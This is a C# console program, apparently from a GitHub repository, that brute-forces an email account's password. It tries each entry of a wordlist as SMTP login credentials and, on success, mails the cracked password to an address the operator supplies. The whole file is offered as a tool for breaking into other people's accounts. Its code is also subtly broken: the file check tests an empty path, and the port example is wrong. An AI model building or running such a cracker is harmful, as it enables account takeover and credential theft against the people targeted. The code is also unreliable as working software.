using System;
using System.IO;
using System.Net;
using System.Net.Mail;

namespace BanderasBruteForce
{
    class BruteForce
    {
        static void Main(string[] args)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("\nHello, user! Thank you for using Bandera`s BruteForce! If you want to support me - Star repository - https://github.com/BAN-dera/Bandera-s-BruteForce");
            Console.WriteLine("\nDictionary Path: ");
            string dictionary_path = Console.ReadLine();
            Console.WriteLine("Cracking email: ");
            string cracking_email = Console.ReadLine();
            Console.WriteLine("Cracking email SMTP(example - smtp.google.com): ");
            string smtp = Console.ReadLine();
            Console.WriteLine("Cracking email SMTP PORT(example - 993)");
            int port = Convert.ToInt16(Console.ReadLine());
            Console.WriteLine("Email to which the password will be sent: ");
            string email = Console.ReadLine();
            if (!File.Exists(""))
            {
                Console.WriteLine("Dictionary not exists!");
                Console.ReadLine();
            }
            else
            {
                string[] passwords = File.ReadAllLines(dictionary_path);
                foreach (string password in passwords)
                {
                    try
                    {
                        SmtpClient client = new SmtpClient(smtp, port);
                        client.EnableSsl = true;
                        client.Timeout = 10000;
                        client.DeliveryMethod = SmtpDeliveryMethod.Network;
                        client.UseDefaultCredentials = false;
                        client.Credentials = new NetworkCredential(cracking_email, password);
                        MailMessage msg = new MailMessage();
                        msg.To.Add(email);
                        msg.From = new MailAddress(cracking_email);
                        msg.Subject = "PASSWORD";
                        msg.Body = "Email: " + cracking_email + "\nPassword: " + password;
                        client.Send(msg);
                        Console.WriteLine("\nPASSWORD FINDED: " + password + "\nTHANK YOU FOR USING BANDERA`S EMAIL BRUTEFORCE!");
                        break;
                    }
                    catch (Exception)
                    {
                        Console.WriteLine("PASSWORD: " + password + " [FAILED]");
                    }
                }
            }
            Console.ReadKey();
        }
    }
}